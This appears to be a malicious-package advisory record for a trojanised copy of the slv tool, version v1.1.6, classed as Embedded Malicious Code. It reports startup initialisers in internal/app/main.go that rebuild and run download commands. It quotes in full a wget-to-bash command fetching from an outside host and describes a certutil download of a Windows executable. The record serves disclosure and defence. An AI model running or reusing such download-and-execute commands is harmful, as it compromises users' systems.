details: A copy of the slv tool (it imports slv.sh/slv) with two package-level initialisers added to internal/app/main.go. They rebuild shell commands from index arrays and run them when the program starts: `wget -O - https://monsoletter.icu/storage/de373d0df/a31546bf | /bin/bash &` on Unix, and on Windows a certutil download that saves and starts appwinx64.exe. The only version is v1.1.6.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code

files.note: v1.1.6: Package-level initialisers that rebuild and run the download commands (lines 26-39).
